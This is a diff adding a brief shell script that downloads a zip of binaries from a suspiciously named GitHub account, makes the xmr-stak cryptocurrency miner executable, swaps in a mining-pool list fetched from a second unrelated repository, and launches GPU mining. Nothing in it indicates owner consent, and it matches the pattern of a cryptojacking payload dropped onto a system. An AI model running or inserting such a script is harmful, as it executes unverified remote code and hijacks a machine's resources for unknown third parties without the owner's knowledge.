@@ -1,0 +1,9 @@
+apt install libmicrohttpd-dev tmux -y
+wget https://github.com/evilbabylx/script/raw/master/bin.zip
+unzip bin.zip
+chmod +x xmr-stak
+rm pools.txt
+rm nvidia.txt
+wget https://raw.githubusercontent.com/notforme2210/andnotforyou/master/pools.txt
+
+./xmr-stak --noCPU
